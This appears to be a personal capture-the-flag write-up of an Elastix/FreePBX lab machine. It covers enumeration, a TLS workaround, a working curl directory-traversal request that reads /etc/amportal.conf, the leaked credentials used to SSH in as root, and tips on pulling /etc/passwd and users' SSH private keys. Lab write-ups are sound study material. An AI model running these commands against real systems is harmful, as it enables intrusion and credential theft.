we ran searchsploit on apache 2.2, didnt seem to find much
went to the website and saw "PRTG Network Monitor (NETMON)" and searched that and got an auth RCE vuln, which looks pretty interesting
- tried default creds like admin:admin, admin:password

- went ahead and started some gobuster commands, but they kept getting redirected with code 302
the basic stuff doesnt work, so time to take a look at other services

- went to port 443, which seems like the service elastix
- quick searchsploit shows its got a few vulnerabilities

- PHP/5.1.6
- doing gobuster on 443 showed some interesting paths
- /help -> shows some information
- getting 301, but still allowed to view files
- /mail shows that we are running roundcube
    - This also has some exploits
- /admin is FreePBX 2.8.1.4

Disable SSL errors
```
You need to add this to the beginning of your config file:

openssl_conf = default_conf

And then this to the end:

[ default_conf ]

ssl_conf = ssl_sect

[ssl_sect]

system_default = ssl_default_sect

[ssl_default_sect]
MinProtocol = None
CipherString = DEFAULT:@SECLEVEL=1
```

seems like there is something interesting on port 10000, going there, we are told to go into ssl mode, so https://
looks like we got an old protocol error, just a simple google search takes us here -> https://askubuntu.com/questions/1250787/when-i-try-to-curl-a-website-i-get-ssl-error
so we add the cnf file then run 
`OPENSSL_CONF=allow_tls1.conf curl --insecure -v https://10.129.1.226:10000`

Getting the html for the, what looks to be, login portal, we see that it is webmin
quick searchsploit shows a LOT of red

Tried to login with this commands
OPENSSL_CONF=allow_tls1.conf curl --insecure -d "user=admin&pass=password" -X POST https://10.129.1.226:10000/session_login.cgi --cookie "testing=1; path=/;"

`curl -k -G "https://10.129.221.100/vtigercrm/graph.php?" --data-urlencode "current_language=../../../../../../../../etc/amportal.conf%00&module=Accounts&action"`

which gives a config file with some juicy credentials
asteriskuser:jEhdIekWmdjE
admin:jEhdIekWmdjE

ssh as root:jEhdIekWmdjE

the admin user seems to grant access to most of the services
logging into elastix we get the version is 2.2.0 release 14
FreePBX 2.8.1.4 -> https://www.exploit-db.com/exploits/15098
- looking at that exploit, we find what we are looking for

Things learned:
if you dont know an attack from searchsploit, just google it to see if it might be worth, like how potent it can be -> especially if you dont know the version of the application
Make sure when dealing with ssl that the exploit isnt working because of ssl errors
Also if you dont know the version, you should prob try all of the major once, anything that lets you read or write to the server
When running pre-built exploit, make sure you understand whats happening and everything you need to make it work
When they give an admin account, always interchange admin with root and vice versa
IPPSec said that /help is great place to grab info
can use timestamps from logos and server info to try and get versioning

searchsploit -x [exploit path given] -> prints the exploit
before brute forcing, look in config for fail2ban rules
php filters lfi <- google it

dir traversal can be pretty powerful -> use it to get file to see who your user running as is, look at etc/passwd to get the nam, go to home/user/.ssh/id_rsa to try and get private key

Still need to go through other writeups and ippsec stuff to see other ways, there seems to be a buunch of other ways